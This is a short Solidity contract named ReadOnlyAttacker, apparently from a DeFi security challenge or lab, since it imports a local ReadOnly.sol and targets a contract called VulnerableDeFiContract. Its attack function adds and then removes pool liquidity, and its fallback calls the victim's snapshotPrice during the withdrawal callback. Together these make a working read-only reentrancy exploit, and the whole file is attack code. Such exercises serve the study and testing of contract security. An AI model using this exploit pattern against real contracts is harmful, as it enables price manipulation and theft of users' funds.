// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../ReadOnly.sol";

contract ReadOnlyAttacker {
    ReadOnlyPool public immutable pool;
    VulnerableDeFiContract public immutable victim;

    constructor(ReadOnlyPool _pool, VulnerableDeFiContract _victim) {
        pool = _pool;
        victim = _victim;
    }

    function attack() external payable {
        pool.addLiquidity{value: msg.value}();
        pool.removeLiquidity();
    }

    fallback() external payable {
        victim.snapshotPrice();
    }
}
